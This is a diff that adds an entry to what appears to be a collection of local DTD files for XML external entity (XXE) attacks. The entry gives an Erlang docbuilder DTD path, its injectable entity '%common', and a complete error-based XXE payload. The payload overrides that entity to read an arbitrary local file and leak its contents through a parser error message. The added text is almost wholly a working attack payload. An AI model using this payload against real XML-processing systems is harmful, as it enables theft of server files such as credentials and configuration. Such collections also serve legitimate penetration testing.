@@ -485,3 +485,26 @@
 ```
 
  --- 
+
+**DTD File:** `/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd`
+
+**Injectable entity:** `%common`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd">
+
+    <!ENTITY % block "xxx" >
+
+    <!ENTITY % common '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
